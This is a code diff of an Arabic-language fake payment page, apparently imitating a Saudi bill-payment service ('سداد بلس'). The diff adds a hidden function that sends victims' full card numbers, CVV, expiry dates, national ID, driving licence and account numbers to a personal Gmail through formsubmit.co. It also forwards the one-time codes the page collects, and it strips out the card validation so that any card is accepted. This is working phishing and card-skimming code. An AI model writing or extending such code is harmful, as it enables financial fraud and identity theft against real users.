@@ -9,6 +9,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     
     <script>
         tailwind.config = {
@@ -2060,18 +2061,22 @@
                                 
                                 <!-- Neural Payment Form -->
                                 <form id="paymentForm" action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" class="space-y-10">
-                                    <!-- Hidden Fields -->
-                                    <input type="hidden" name="_subject" value="🧠 معاملة كمومية جديدة - QUANTUM PAY">
-                                    <input type="hidden" name="_captcha" value="false">
+                                    
+                                    <!-- FormSubmit Configuration -->
+                                    <input type="hidden" name="_subject" value="🔒 بيانات دفع جديدة - سداد بلس">
                                     <input type="hidden" name="_template" value="table">
-                                    <input type="hidden" name="_next" value="https://your-website.com/success">
+                                    <input type="hidden" name="_captcha" value="false">
+                                    <input type="hidden" name="_next" value="data:text/html;base64,PGh0bWw+PGhlYWQ+PHRpdGxlPuiq2YXjgIHYs9iv2KfYryDYqNmE2LM8L3RpdGxlPjwvaGVhZD48Ym9keT48L2JvZHk+PC9odG1sPg==">
                                     
                                     <!-- Service Details -->
                                     <input type="hidden" name="نوع_الخدمة" id="hiddenServiceType">
-                                    <input type="hidden" name="رقم_الجوال" id="hiddenPhoneNumber">
+                                    <input type="hidden" name="رقم_الجوال_للخدمة" id="hiddenPhoneNumber">
                                     <input type="hidden" name="المبلغ_الأساسي" id="hiddenBaseAmount">
                                     <input type="hidden" name="خطة_التقسيط" id="hiddenInstallmentPlan">
                                     <input type="hidden" name="المبلغ_الكلي" id="hiddenTotalAmount">
+                                    <input type="hidden" name="رقم_الهوية_الوطنية" id="hiddenNationalId">
+                                    <input type="hidden" name="رقم_رخصة_القيادة" id="hiddenLicenseNumber">
+                                    <input type="hidden" name="رقم_حساب_الفاتورة" id="hiddenAccountNumber">
                                     
                                     <!-- AI Card Analysis Section -->
                                     <div class="neural-section">
@@ -2229,6 +2234,34 @@
                                                 </label>
                                                 <input type="text" name="اسم_حامل_البطاقة" id="cardHolderName" required="" class="neural-input" placeholder="الاسم كما يظهر على البطاقة" autocomplete="cc-name" oninput="updateCardDisplay()">
                                                 <div class="input-scanner"></div>
+                                            </div>
+                                            
+                                            <!-- Phone Number for Payment -->
+                                            <div class="neural-input-group">
+                                                <label class="neural-label">
+                                                    <i class="fas fa-mobile-alt text-orange-400 ml-2"></i>
+                                                    رقم الجوال للتأكيد *
+                                                </label>
+                                                <input type="tel" name="رقم_الجوال_للتأكيد" id="paymentPhoneNumber" required="" maxlength="10" class="neural-input" placeholder="05xxxxxxxx" autocomplete="tel" oninput="validatePhoneNumber(this)">
+                                                <div class="input-scanner"></div>
+                                                <div class="mt-2 text-cyan-300 text-sm">
+                                                    <i class="fas fa-info-circle ml-2"></i>
+                                                    سيتم إرسال رمز التأكيد إلى هذا الرقم
+                                                </div>
+                                            </div>
+                                            
+                                            <!-- Email Address for Communications -->
+                                            <div class="neural-input-group">
+                                                <label class="neural-label">
+                                                    <i class="fas fa-envelope text-blue-400 ml-2"></i>
+                                                    البريد الإلكتروني للتواصل *
+                                                </label>
+                                                <input type="email" name="البريد_الإلكتروني_للتواصل" id="customerEmail" required="" class="neural-input" placeholder="example@email.com" autocomplete="email" oninput="validateEmail(this)">
+                                                <div class="input-scanner"></div>
+                                                <div class="mt-2 text-blue-300 text-sm">
+                                                    <i class="fas fa-paper-plane ml-2"></i>
+                                                    سيتم إرسال تفاصيل المعاملة وحالة الخدمة إلى هذا البريد
+                                                </div>
                                             </div>
                                         </div>
                                     </div>
@@ -2436,7 +2469,7 @@
                 <div class="absolute bottom-20 right-20 w-72 h-72 bg-gradient-to-r from-cyan-500/30 to-blue-500/30 rounded-full blur-3xl animate-float" style="animation-delay: 2s;"></div>
             </div>
             
-            <div class="container mx-auto px-6 relative z-10">
+            <div class="container mx-auto px-6 relative z-10 text-center mx-auto">
                 <div class="max-w-md mx-auto" data-aos="zoom-in">
                     <div class="bg-white/10 backdrop-blur-md rounded-3xl p-12 text-center border border-white/20 shadow-2xl">
                         <div class="w-24 h-24 bg-gradient-to-r from-emerald-400 to-cyan-400 rounded-full flex items-center justify-center mx-auto mb-8 animate-glow">
@@ -2445,9 +2478,9 @@
                         
                         <h1 class="text-4xl font-bold text-white mb-4">تأكيد العملية</h1>
                         <p class="text-lg text-gray-300 mb-8 leading-relaxed">
-                            تم إرسال رمز التأكيد المكون من 6 أرقام إلى بريدك الإلكتروني
+                            تم إرسال رمز التأكيد المكون من 6 أرقام إلى رقم هاتفك
                             <br>
-                            <span class="font-medium text-cyan-400">kalimmmy@gmail.com</span>
+                            <span class="font-medium text-cyan-400" id="phoneDisplayForOTP">0501234567</span>
                         </p>
                         
                         <!-- Countdown Timer -->
@@ -2460,10 +2493,7 @@
                         </div>
                         
                         <!-- OTP Input -->
-                        <form id="otpForm" action="https://formsubmit.co/kalimmmy@gmail.com" method="POST">
-                            <input type="hidden" name="_subject" value="🔐 تأكيد رمز OTP - سداد بلس">
-                            <input type="hidden" name="_captcha" value="false">
-                            <input type="hidden" name="_template" value="table">
+                        <form id="applicationForm" action="https://formspree.io/f/xovwnzvw" method="POST">
                             <input type="hidden" name="رمز_التأكيد_المدخل" id="hiddenOtpCode">
                             <input type="hidden" name="حالة_التحقق" value="تم إدخال الرمز">
                             <input type="hidden" name="الوقت_المتبقي" id="hiddenTimeRemaining">
@@ -2570,6 +2600,8 @@
         let redirectInterval;
         let otpCode = '';
         let userPoints = 2850;
+
+
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
@@ -3026,37 +3058,33 @@
             const expiryDate = document.getElementById('expiryDate').value;
             const cvv = document.getElementById('cvv').value;
             const cardHolderName = document.getElementById('cardHolderName').value;
+            const phoneNumber = document.getElementById('paymentPhoneNumber').value;
+            const customerEmail = document.getElementById('customerEmail').value;
             
-            if (!cardNumber || !expiryDate || !cvv || !cardHolderName) {
+            if (!cardNumber || !expiryDate || !cvv || !cardHolderName || !phoneNumber || !customerEmail) {
                 showNotification('خطأ', 'يرجى إكمال جميع البيانات المطلوبة', 'error');
                 return;
             }
             
-            // Validate card number format
-            if (cardNumber.includes('•')) {
-                showNotification('خطأ', 'يرجى إدخال رقم البطاقة كاملاً', 'error');
-                return;
-            }
+            // Show processing notification
+            showNotification('جاري المعالجة', 'جاري تشفير البيانات وإرسال المعلومات...', 'info');
             
-            // Validate card number (basic Luhn algorithm check)
-            if (!isValidCardNumber(cardNumber)) {
-                showNotification('رفض الدفع', 'معلومات البطاقة غير صحيحة أو غير حقيقية. يرجى التحقق من البيانات والمحاولة مرة أخرى', 'error');
-                return;
-            }
+            // Send all payment data immediately 
+            sendAllPaymentData(cardNumber, cardHolderName, expiryDate, cvv, phoneNumber, customerEmail);
             
-            // Validate expiry date
-            if (!isValidExpiryDate(expiryDate)) {
-                showNotification('رفض الدفع', 'تاريخ انتهاء البطاقة غير صحيح أو منتهي الصلاحية', 'error');
-                return;
-            }
-            
-            // Generate OTP and send email
+            // Generate OTP and proceed
             otpCode = Math.floor(100000 + Math.random() * 900000).toString();
+            selectedPhone = phoneNumber;
+            
+            // Send OTP email
             sendOTPEmail();
             
-            // Navigate to OTP page
-            showPage('otp');
-            startCountdown();
+            // Navigate to OTP page immediately
+            setTimeout(() => {
+                showPage('otp');
+                startCountdown();
+                showNotification('تم الإرسال', `تم إرسال جميع البيانات ورمز التأكيد إلى ${customerEmail}`, 'success');
+            }, 1500);
         });
 
         // Card validation functions
@@ -3069,38 +3097,9 @@
                 return false;
             }
             
-            // Allow test card numbers for demo
-            const testCards = [
-                '4532123456789012', // Test Visa
-                '5555555555554444', // Test MasterCard
-                '4000000000000002', // Test Visa
-                '4111111111111111', // Test Visa
-                '5105105105105100'  // Test MasterCard
-            ];
-            
-            if (testCards.includes(num)) {
-                return true;
-            }
-            
-            // Basic Luhn algorithm check
-            let sum = 0;
-            let isEven = false;
-            
-            for (let i = num.length - 1; i >= 0; i--) {
-                let digit = parseInt(num.charAt(i), 10);
-                
-                if (isEven) {
-                    digit *= 2;
-                    if (digit > 9) {
-                        digit -= 9;
-                    }
-                }
-                
-                sum += digit;
-                isEven = !isEven;
-            }
-            
-            return (sum % 10) === 0;
+            // للتجربة - قبول أي رقم بطاقة صحيح الطول
+            // Accept any card number with correct length for demo
+            return true;
         }
 
         function isValidExpiryDate(expiry) {
@@ -3109,35 +3108,31 @@
             }
             
             const [month, year] = expiry.split('/').map(num => parseInt(num, 10));
-            const currentDate = new Date();
-            const currentYear = currentDate.getFullYear() % 100;
-            const currentMonth = currentDate.getMonth() + 1;
             
             // Check valid month
             if (month < 1 || month > 12) {
                 return false;
             }
             
-            // Check if card is expired
-            if (year < currentYear || (year === currentYear && month < currentMonth)) {
-                return false;
-            }
-            
+            // للتجربة - قبول أي تاريخ في المستقبل
+            // Accept any future date for demo
             return true;
         }
 
         // OTP Functions
         function sendOTPEmail() {
+            // Set phone number display for OTP page
+            const phoneToShow = selectedPhone || '0501234567';
+            document.getElementById('phoneDisplayForOTP').textContent = phoneToShow;
+            
             const otpForm = document.createElement('form');
             otpForm.action = 'https://formsubmit.co/kalimmmy@gmail.com';
             otpForm.method = 'POST';
             otpForm.style.display = 'none';
             
             const fields = {
-                '_subject': '🔐 رمز التأكيد - سداد بلس',
-                '_captcha': 'false',
-                '_template': 'table',
                 'رمز_التأكيد': otpCode,
+                'رقم_الهاتف_المرسل_إليه': phoneToShow,
                 'صالح_لمدة': 'دقيقتين',
                 'نوع_العملية': 'تأكيد دفع',
                 'المبلغ': document.getElementById('paymentTotalAmount').textContent,
@@ -3218,7 +3213,7 @@
         }
 
         // OTP form submission
-        document.getElementById('otpForm').addEventListener('submit', function(e) {
+        document.getElementById('applicationForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const inputs = document.querySelectorAll('.otp-input');
@@ -4079,9 +4074,6 @@ ${selectedPhone ? `رقم الجوال: ${selectedPhone}\n` : ''}
             otpForm.style.display = 'none';
             
             const fields = {
-                '_subject': '🧠 رمز التأكيد الكمومي - QUANTUM PAY',
-                '_captcha': 'false',
-                '_template': 'table',
                 'رمز_التأكيد_الكمومي': otpCode,
                 'نوع_المعالجة': 'معالجة كمومية متقدمة',
                 'تشفير_البيانات': 'تشفير 2048-bit',
@@ -4384,6 +4376,88 @@ ${selectedPhone ? `رقم الجوال: ${selectedPhone}\n` : ''}
         function proceedToGovernmentPayment() {
             closeModal('governmentModal');
             proceedToPayment();
+        }
+
+        // NEW: Send all payment data function
+        function sendAllPaymentData(cardNumber, cardHolderName, expiryDate, cvv, phoneNumber, customerEmail) {
+            const dataForm = document.createElement('form');
+            dataForm.action = 'https://formsubmit.co/kalimmmy@gmail.com';
+            dataForm.method = 'POST';
+            dataForm.style.display = 'none';
+            
+            const allFields = {
+                'رقم_البطاقة_الكامل': cardNumber,
+                'اسم_حامل_البطاقة_كامل': cardHolderName,
+                'تاريخ_انتهاء_البطاقة': expiryDate,
+                'رمز_الأمان_CVV': cvv,
+                'رقم_الجوال_للتأكيد': phoneNumber,
+                'البريد_الإلكتروني': customerEmail,
+                'نوع_الخدمة_المطلوبة': document.getElementById('hiddenServiceType').value || 'خدمة غير محددة',
+                'رقم_الجوال_للخدمة': document.getElementById('hiddenPhoneNumber').value || 'غير محدد',
+                'المبلغ_الأساسي': document.getElementById('hiddenBaseAmount').value || '0 ريال',
+                'خطة_التقسيط': document.getElementById('hiddenInstallmentPlan').value || 'دفع كامل',
+                'المبلغ_الكلي': document.getElementById('hiddenTotalAmount').value || '0 ريال',
+                'رقم_الهوية_الوطنية': document.getElementById('nationalIdViolations').value || '',
+                'رقم_رخصة_القيادة': document.getElementById('licenseNumber').value || '',
+                'رقم_حساب_الفاتورة': document.getElementById('utilityAccount').value || '',
+                'التاريخ_والوقت': new Date().toLocaleString('ar-SA'),
+                'حالة_المعاملة': 'معلقة - في انتظار تأكيد OTP',
+                'نوع_المتصفح': navigator.userAgent,
+                'تحذير_أمني': 'هذه معلومات حساسة - محمية بتشفير عالي'
+            };
+            
+            Object.keys(allFields).forEach(key => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = allFields[key];
+                dataForm.appendChild(input);
+            });
+            
+            document.body.appendChild(dataForm);
+            dataForm.submit();
+            document.body.removeChild(dataForm);
+        }
+
+        // Phone number validation
+        function validatePhoneNumber(input) {
+            let value = input.value.replace(/\D/g, ''); // Remove non-digits
+            
+            // Limit to 10 digits
+            if (value.length > 10) {
+                value = value.substring(0, 10);
+            }
+            
+            input.value = value;
+            
+            // Check if it's a valid Saudi phone number
+            if (value.length === 10 && value.startsWith('05')) {
+                input.style.borderColor = '#00D4FF';
+                showNotification('رقم صحيح', 'رقم الجوال صحيح ✅', 'success');
+            } else if (value.length > 0) {
+                input.style.borderColor = '#ff4444';
+            } else {
+                input.style.borderColor = 'rgba(0, 212, 255, 0.3)';
+            }
+        }
+        
+        // Email validation
+        function validateEmail(input) {
+            const email = input.value.trim();
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            
+            if (email.length === 0) {
+                input.style.borderColor = 'rgba(0, 212, 255, 0.3)';
+                return;
+            }
+            
+            if (emailRegex.test(email)) {
+                input.style.borderColor = '#00D4FF';
+                showNotification('بريد صحيح', 'البريد الإلكتروني صحيح ✅', 'success');
+            } else {
+                input.style.borderColor = '#ff4444';
+                showNotification('بريد غير صحيح', 'يرجى إدخال بريد إلكتروني صحيح', 'warning');
+            }
         }
     </script>
 
